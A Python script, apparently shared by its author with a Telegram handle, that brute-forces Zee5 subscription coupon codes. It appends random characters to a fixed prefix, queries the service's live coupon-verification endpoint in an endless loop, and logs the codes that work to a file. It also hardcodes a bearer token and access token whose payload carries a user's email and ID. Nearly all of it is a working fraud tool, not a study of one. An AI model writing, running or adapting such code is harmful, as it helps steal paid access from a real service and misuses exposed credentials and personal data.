import requests
import threading
import random
import string
import json
from termcolor import colored
import pyfiglet

font = pyfiglet.Figlet(font='slant')
name = font.renderText('ZEE5 CODES')
description = """\n
Zee5 Codes Generator and Checker (3 MONTHS)
--------------------------------
Valid codes are saved in TXT file \ncontact me on Telegram: @adro_xd.
"""

print(name)
print(description)

base_url = "https://securepayment.zee5.com/paymentGateway/coupon/verification?coupon_code={}&translation=en&country_code=IN"

headers = {
    "Host": "securepayment.zee5.com",
    "Sec-Ch-Ua": '"Chromium";v="105",3K, "Not)A;Brand";v="8"',
    "Authorization": 'bearer eyJraWQiOiJlNmxfbGYweHpwYVk4VzBNcFQzWlBzN2hyOEZ4Y0trbDhDV0JaekVKT2lBIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiI3MGMwZTU5NS1mNzZhLTQyMWItODEyOS1hYzcyM2NlYTBhY2YiLCJzdWJzY3JpcHRpb25zIjoiW10iLCJhY3RpdmF0aW9uX2RhdGUiOiIyMDIzLTA1LTMwIDA2OjE4OjM4LjE0MyIsImFtciI6WyJkZWxlZ2F0aW9uIl0sImlzcyI6Imh0dHBzOi8vdXNlcmFwaS56ZWU1LmNvbSIsImN1cnJlbnRfY291bnRyeSI6IklOIiwiY2xpZW50X2lkIjoicmVmcmVzaF90b2tlbiIsImFjY2Vzc190b2tlbl90eXBlIjoiRGVmYXVsdFByaXZpbGVnZSIsInVzZXJfdHlwZSI6IlJlZ2lzdGVyZWQiLCJzY29wZSI6WyJ1c2VyYXBpIiwic3Vic2NyaXB0aW9uYXBpIiwicHJvZmlsZWFwaSJdLCJhdXRoX3RpbWUiOjE2ODU0Mjc1MTgsImV4cCI6MTY4ODA1NzUxOCwiaWF0IjoxNjg1NDI3NTE4LCJ1c2VyX2VtYWlsIjoidGhvcm9wQHJlZGlmZm1haWwuY29tIiwiZGV2aWNlX2lkIjoic3FXOEdpbHJwMFBpaFZkY3ZUeUUwMDAwMDAwMDAwMDAiLCJyZWdpc3RyYXRpb25fY291bnRyeSI6IklOIiwidmVyc2lvbiI6NCwiYXVkIjpbInVzZXJhcGkiLCJzdWJzY3JpcHRpb25hcGkiLCJwcm9maWxlYXBpIl0sInN5c3RlbSI6Ilo1IiwibmJmIjoxNjg1NDI3NTE4LCJpZHAiOiJsb2NhbCIsInVzZXJfaWQiOiI3MGMwZTU5NS1mNzZhLTQyMWItODEyOS1hYzcyM2NlYTBhY2YiLCJjcmVhdGVkX2RhdGUiOiIyMDIzLTA1LTMwIDA2OjE4OjM4LjE0MyIsImFjdGl2YXRlZCI6dHJ1ZX0.2SHAC_7FMotO9rNpNKDPVtr6HieMF_1VgIEwFBZsyWQ76qvaDI4nfHWX7PWJfuHhZvMLjsGUHG0CcYWGPtOC50tgxjifqbMYeWy6HvkRConWaBSZOl1ZBzxR3VLQKuQ_dWNbZ0fvATWf6OHhlQRGOelP_n68Ai6WofSOOhl3QRb3LJFFXQvD6AaOYxJTYfpmedk1tG48m0wjF-q5SZNqzYfFsZYUzznTNoa4mpczRhYN8ZeWRarxl1JBj3Az4QLIX3vrzekjpSGS52Tm47_YWMCHzpUq2Ph4IpzX3my_Ii5V8O8A-HpavklF9buJAkLA1T03m0ciOTxYXehiDLto2g',
    "Sec-Ch-Ua-Mobile": "?1",
    "X-Access-Token": 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwbGF0Zm9ybV9jb2RlIjoiV2ViQCQhdDM4NzEyIiwiaXNzdWVkQXQiOiIyMDIzLTA1LTI5VDIxOjIwOjE3LjY5N1oiLCJwcm9kdWN0X2NvZGUiOiJ6ZWU1QDk3NSIsInR0bCI6ODY0MDAwMDAsImlhdCI6MTY4NTM5NTIxN30.OQNpUQFLdqoxZVuQuHhrRLOHE_pQktzNMP2XAQbLivE',
    "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Mobile Safari/537.36",
    "Sec-Ch-Ua-Platform": '"Android"',
    "Accept": "*/*",
    "Origin": "https://www.zee5.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.zee5.com/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-3K,en;q=3.9",
    "Connection": "close"
}

def print_color(text, color):
    colors = {
        "green": '\033[92m',  
        "yellow": '\033[93m',  
        "red": '\033[91m',  
        "end": '\033[0m'  
    }
    print(f"{colors[color]}{text}{colors['end']}")
    
def random_string(prefix="Z5PPAP23Q"):
    return prefix + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    
def check_code():
    code = random_string()
    url = base_url.format(code)
    response = requests.get(url, headers=headers)
    
    try:
        response_json = response.json()
        message = response_json.get('message', '')
        
        if "applied successfully" in message:
            color = 'green'
            formatted_response = f"Code = {code}, Message = {message}"
            
            with open("zee5code.txt", "a") as f:
                f.write(f"{formatted_response}\n")
                
        elif "already redeemed" in message:
            color = 'yellow'
            formatted_response = f"Code = {code}, Message = {message}"
        else:
            color = 'red'
            formatted_response = f"Code = {code}, Message = {message}"
        
        print(colored(formatted_response, color))
        
    except json.JSONDecodeError:
        print(f"Failed to parse response for Code = {code}")




def worker():
    while True:
        check_code()

threads = []
for _ in range(1):  
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

for thread in threads:
    thread.join()
